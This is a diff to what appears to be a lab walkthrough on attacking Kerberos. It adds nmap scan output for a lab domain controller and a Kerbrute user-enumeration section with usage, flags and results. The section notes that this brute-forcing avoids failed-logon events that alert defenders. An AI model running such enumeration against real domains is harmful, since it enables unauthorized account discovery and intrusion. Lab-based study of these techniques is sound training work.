@@ -129,5 +129,158 @@ The main ticket that you will see is a ticket-granting ticket these can come in 
 RECON
 ======================================================================================================
 
+### Nmap Results
+**Open Ports**
+
+```nmap
+Discovered open port 22/tcp on 10.10.53.187
+Discovered open port 445/tcp on 10.10.53.187
+Discovered open port 3389/tcp on 10.10.53.187
+Discovered open port 135/tcp on 10.10.53.187
+Discovered open port 53/tcp on 10.10.53.187
+Discovered open port 139/tcp on 10.10.53.187
+Discovered open port 88/tcp on 10.10.53.187
+Discovered open port 593/tcp on 10.10.53.187
+Discovered open port 3269/tcp on 10.10.53.187
+Discovered open port 3268/tcp on 10.10.53.187
+Discovered open port 464/tcp on 10.10.53.187
+Discovered open port 389/tcp on 10.10.53.187
+Discovered open port 636/tcp on 10.10.53.187
+```
+
+**Discovered Services**
+
+```python
+PORT     STATE SERVICE       REASON  VERSION
+22/tcp   open  ssh           syn-ack OpenSSH for_Windows_7.7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 68:f2:8b:17:15:7c:90:d7:4e:0f:8e:d1:4c:6a:be:98 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBYAa9AZBsEOwCK/28ymk+6ZkIdxdK3dfRnFaUZHlSqUgdz5Fjn/wyUeuAChlOvF6yjcGtcqvx62/Cw8ngaubb9B7QYt8XWGy4aFRL/IYX0O7MiEJQ6YIPGYKQSOs2m/F07FrQPLnzytQ3oh0Gkl6zpOEGtcPYa8BtFj6vpdVthaDipnm4TetegdwUAeRpq1m9chBWONPfU0syMn2TuA8jw+sFIkOCE+x+ylOjHeJ63ncdvrvPeUSkwD//qeOg6JdwaDk3jdtuKxphxkczsc2VvU/OeJ8wW7MMQy2nO1JZTCtrWlms8d2+j1V8pR+fhLIuKu+JpwbLqgr5jieB1CIl
+|   256 b0:3a:a7:c3:88:2e:c1:0b:d7:be:1e:43:1c:f7:5b:34 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCGER+LQSfN21aCiK2J5UoJ7elNly98IB2TIQejTa/vdve8vfzhOcZNkdmCRcwcfqvmMM7eScuhnyuV2l34lDoE=
+|   256 03:c0:ee:58:32:ae:6a:cc:8e:1a:7d:8b:20:c8:a2:bb (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBkJkzX/eHfebkreDRkbu0WtQB1EnQtRuYvx3rooVnqm
+53/tcp   open  domain        syn-ack Simple DNS Plus
+88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-08-04 15:23:20Z)
+135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds? syn-ack
+464/tcp  open  kpasswd5?     syn-ack
+593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped    syn-ack
+3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped    syn-ack
+3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: CONTROLLER
+|   NetBIOS_Domain_Name: CONTROLLER
+|   NetBIOS_Computer_Name: CONTROLLER-1
+|   DNS_Domain_Name: CONTROLLER.local
+|   DNS_Computer_Name: CONTROLLER-1.CONTROLLER.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2021-08-04T15:23:25+00:00
+| ssl-cert: Subject: commonName=CONTROLLER-1.CONTROLLER.local
+| Issuer: commonName=CONTROLLER-1.CONTROLLER.local
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-08-03T14:13:31
+| Not valid after:  2022-02-02T14:13:31
+| MD5:   1499 5129 24fd 6dfb be1f 25ee 7b35 65c6
+| SHA-1: ae7c 317e 71af 89ff aa43 8034 359e 0f86 5e6d d48f
+| -----BEGIN CERTIFICATE-----
+| MIIC/jCCAeagAwIBAgIQcPG6j9NR2YhKWwJpr8KG9jANBgkqhkiG9w0BAQsFADAo
+| MSYwJAYDVQQDEx1DT05UUk9MTEVSLTEuQ09OVFJPTExFUi5sb2NhbDAeFw0yMTA4
+| MDMxNDEzMzFaFw0yMjAyMDIxNDEzMzFaMCgxJjAkBgNVBAMTHUNPTlRST0xMRVIt
+| MS5DT05UUk9MTEVSLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
+| AQEApFFetGqSDkwTeVJBnSTxkQL14FkgXghpTsBwW5ehPS00BoxDeUs5To6enRbO
+| eeDtZqpT6YVYaOaZrNO7MVVO0DmnFU+0CNwv7U3wRDnZ3IBT0xI/NUWmenTgWVAa
+| 8eRI/Bo4s8sdnIZeMJhkoEeNP1lHvW8PJ+U1sJlkQ+rIsqzl0hY4i3bPrT+TbXNr
+| DTrcozggyelQA6QuVRBMAZv0tx9CO5Qy4/fHIMxeWnQ/HMnGJGFHLUNsvQo//fz4
+| 93FiW4pEN3g7cCOotbBoJ2SittHBnz2UzPCVya2LLgwZSMC20Xf1RRPvlUDlX4Y5
+| OVLJiebrh1bLivonZN+Yj68lvQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcD
+| ATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAABP909fAz29d4/waYXv
+| NUpEFr059pKNhP8H5G8S9HHx7AWulaK1v9oD9YTwj7WXvWnbnV4jXdJ/t5Buc20N
+| wxypAICiiWo+TNoVrdI3T4VAbv4oE0HOkV8A0hKbO8WB3o/GJdtfGajxbKgSdng+
+| vczPpXsAzkET43w47mIedbOWncEHO+ZQXI9lSiawkJ6Q5w7bBfm42c2Fpc7Qnehr
+| a0GXOZy37nKQ/Z8sX3sqbcfhzcFubvBEVv5TPtTLacg6MTYNnmQypBT1Zd7HrdK5
+| IpEkrWoobWwABVEIFaTnoAufJ+UEwIEgr2Hs2f/Ef4q/H32Lb0kjEfGl1pB4On4N
+| 6ag=
+|_-----END CERTIFICATE-----
+|_ssl-date: 2021-08-04T15:23:34+00:00; +1s from scanner time.
+Service Info: Host: CONTROLLER-1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 0s, deviation: 0s, median: 0s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 63676/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 35663/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 15536/udp): CLEAN (Timeout)
+|   Check 4 (port 49690/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-08-04T15:23:26
+|_  start_date: N/A
+
+```
+Enumeration with Kerbrute
+=============================================================================================================================================
+
+### Overview
+
+By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.
 
 
+For this lab you need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - 10.10.53.187  CONTROLLER.local
+
+### Git addr
+
+`https://github.com/ropnop/kerbrute/releases`
+
+### Usage
+
+```bash
+./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local usernames.txt
+```
+
+`./kerbrute` Execute kerbrute 
+
+`userenum` In user enumeration mode
+
+`--dc CONTROLLER.local` To domain controller named "CONTROLLER.local" 
+
+`-d CONTROLLER.local` To the domain with the same name (in this case)
+
+`usernames.txt` and use our supplied list of possible usernames.
+
+### Kerbrute Results
+
+```bash
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 08/04/21 - Ronnie Flathers @ropnop
+
+2021/08/04 11:53:54 >  Using KDC(s):
+2021/08/04 11:53:54 >   CONTROLLER.local:88
+
+2021/08/04 11:53:54 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
+2021/08/04 11:53:54 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
+2021/08/04 11:53:54 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
+2021/08/04 11:53:55 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
+2021/08/04 11:53:55 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
+2021/08/04 11:53:55 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
+2021/08/04 11:53:55 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
+2021/08/04 11:53:55 >  [+] VALID USERNAME:       user3@CONTROLLER.local
+2021/08/04 11:53:55 >  [+] VALID USERNAME:       user2@CONTROLLER.local
+2021/08/04 11:53:55 >  [+] VALID USERNAME:       user1@CONTROLLER.local
+2021/08/04 11:53:55 >  Done! Tested 100 usernames (10 valid) in 0.852 seconds
+```
